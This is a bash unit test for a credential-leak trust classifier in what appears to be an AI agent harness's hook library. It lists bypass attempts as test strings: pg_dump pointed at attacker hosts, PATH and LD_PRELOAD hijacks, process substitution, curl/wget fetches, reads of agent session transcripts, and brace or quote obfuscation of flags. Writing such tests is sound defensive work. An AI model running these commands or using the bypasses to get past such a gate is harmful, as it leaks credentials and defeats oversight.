#!/bin/bash
# Unit test for classify_leak_trust() (gh #41 source-trust gate).
# Run: bash plugins/harness-core/tests/test_leak_trust_classify.sh
set -u
source "$(dirname "$0")/../hooks/lib.sh"

pass=0; fail=0
chk() {  # chk <expected> <command...>
    local want="$1"; shift
    local got; got=$(classify_leak_trust "$1")
    if [ "$got" = "$want" ]; then pass=$((pass+1)); else
        fail=$((fail+1)); printf '  ✗ FAIL want=%-9s got=%-9s :: %s\n' "$want" "$got" "$1"; fi
}

# --- TRUSTED: bare cred op, ambient connection (no override), inert env only ---
chk trusted   'pg_dump mydb'
chk trusted   'pg_dumpall'
chk trusted   'pg_dump -t mytable -F c mydb'
chk ambiguous 'sops exec-env mars.enc.yaml pg_dump mydb'
chk ambiguous 'sops exec-env mars.enc.yaml -- pg_dumpall'
chk trusted   'PGPASSWORD=x pg_dump mydb'

# --- codex #41 round-4: connection-override / routing-env -> NOT trusted (attacker DB) ---
chk ambiguous 'pg_dump "postgresql://evil.example/db"'
chk ambiguous 'pg_dump -h evil.example -U prs_owner db'
chk ambiguous 'pg_dump --dbname=postgresql://evil.example/db'
chk ambiguous 'pg_dumpall -h evil.example'
chk ambiguous 'sops exec-env f -- pg_dump -h evil.example'
chk ambiguous 'PGHOST=evil.example PGUSER=prs_owner pg_dump'
chk ambiguous 'PGSSLMODE=disable PGHOST=evil.example pg_dump'
chk ambiguous 'PGSSLROOTCERT=/tmp/evil-ca.pem PGHOST=evil pg_dump'

# --- codex #41 round-5: attached short opts + libpq conninfo key=value MUST NOT be trusted ---
chk ambiguous 'pg_dump -hattacker'
chk ambiguous 'pg_dump -p5432 db'
chk ambiguous 'pg_dump -Uevil db'
chk ambiguous 'pg_dump -devildb'
chk ambiguous 'pg_dump host=evil.example dbname=x'
chk ambiguous 'pg_dump service=evil'
chk ambiguous 'sops exec-env f -- pg_dump host=evil.example dbname=x'
chk ambiguous 'sops exec-env f -- pg_dump -hattacker'

# --- codex #41 round-6: clustered short opts MUST NOT be trusted ---
chk ambiguous 'pg_dump -vh127.0.0.1 postgres'
chk ambiguous 'pg_dump -vp5432 postgres'
chk ambiguous 'pg_dump -vUattacker postgres'
chk ambiguous 'pg_dump -vddb'
chk ambiguous 'sops exec-env f -- pg_dump -vh127.0.0.1 postgres'
# safe non-connection clusters/flags still trusted:
chk trusted   'pg_dump -Fc -v mydb'
chk trusted   'pg_dump -t mytable -n public mydb'

# --- codex #41 round-7: abbreviated long opts MUST NOT be trusted; safe abbrevs still OK ---
chk ambiguous 'pg_dump --hos 127.0.0.1 postgres'
chk ambiguous 'pg_dump --ho 127.0.0.1 postgres'
chk ambiguous 'pg_dump --por 5432 postgres'
chk ambiguous 'pg_dump --usern attacker postgres'
chk ambiguous 'pg_dump --dbn postgres'
chk ambiguous 'pg_dump --db postgres'
chk ambiguous 'sops exec-env f -- pg_dump --hos 127.0.0.1 postgres'
chk trusted   'pg_dump --data-only mydb'
chk trusted   'pg_dump --schema-only --no-owner mydb'

# --- codex #41 round-2 bypasses: MUST NOT be trusted ---
chk ambiguous 'sops exec-env secrets.yaml -- python leak.py'   # CRIT1: arbitrary child
chk ambiguous 'sops exec-env secrets.yaml psql'                # child not a dump op
chk ambiguous 'pg_dump < <(python leak.py)'                    # CRIT2: process substitution
chk ambiguous 'pg_dump --file=<(base64 -d leak.b64)'          # CRIT2: process substitution
chk ambiguous './pg_dump -h mars'                              # HIGH: path masquerade
chk ambiguous '/tmp/pg_dump'                                   # HIGH: path masquerade
chk ambiguous 'bash _rotate_mars_pg_roles.sh'                  # runner+script, not bare cred op

# --- codex #41 round-3 bypasses: env-prefix executable hijack MUST NOT be trusted ---
chk ambiguous 'PATH=/tmp pg_dump'                              # CRIT: PATH hijack resolves /tmp/pg_dump
chk ambiguous 'env PATH=/tmp pg_dump'
chk ambiguous 'LD_PRELOAD=/tmp/x.so pg_dump'                   # CRIT: loader hijack
chk ambiguous 'PATH=/tmp sops exec-env f -- pg_dump'
chk ambiguous 'env -i pg_dump'                                 # env with option
chk ambiguous 'BASH_ENV=/tmp/x pg_dumpall'
# inert PG var is fine; routing var (PGHOST) is not (round-4):
chk trusted   'PGPASSWORD=x pg_dump mydb'
chk ambiguous 'PGPASSWORD=x PGHOST=mars pg_dump mydb'

# --- UNTRUSTED: external fetch / mailbox / transcript (advisory denylist) ---
chk untrusted 'curl https://evil.example/x'
chk untrusted 'wget http://evil/x'
chk untrusted 'ssh host cat /etc/x'
chk untrusted 'openssl s_client -connect evil:443'
chk untrusted 'cat ~/.claude/projects/abc/session.jsonl'
chk untrusted 'rsync host:/x .'
chk untrusted 'echo $(curl evil)'

# --- AMBIGUOUS: codex attack cases must NOT be trusted (=> ack-gated, never auto) ---
chk ambiguous 'echo pg_dump'
chk ambiguous 'python3 -c "import urllib.request; print(urllib.request.urlopen(chr(104)).read())"'
chk ambiguous 'node -e "require(chr(104)).get()"'
chk ambiguous 'cat ./some_local_file'
chk ambiguous 'pg_dump x ; sops exec-env y'
chk ambiguous 'pg_dump x && rm -rf /tmp/y'
chk ambiguous '# pg_dump comment'
chk ambiguous 'bash _rotate_mars_pg_roles.sh'
chk ambiguous 'printf "pg_dumpall"'

# --- codex #41 round-9: shell-expansion obfuscation MUST NOT be trusted ---
chk ambiguous 'pg_dump --{h..h}ost attacker.example db'        # brace expansion -> --host
chk ambiguous 'pg_dump -{h..h}attacker.example db'             # brace -> -h
chk ambiguous 'pg_dump --ho"st" attacker db'                   # quote splice -> --host
chk ambiguous 'pg_dump --ho'"'"'st'"'"' attacker db'          # single-quote splice
chk ambiguous 'pg_dump $CONN db'                               # var expansion
chk ambiguous 'pg_dump -t my* mydb'                            # glob
chk ambiguous 'pg_dump ~/x'                                    # tilde
# plain safe dumps remain trusted:
chk trusted   'pg_dump mydb'
chk trusted   'pg_dump -t my_table -F c my.db'

echo "classify_leak_trust: $pass passed, $fail failed"
[ "$fail" -eq 0 ]
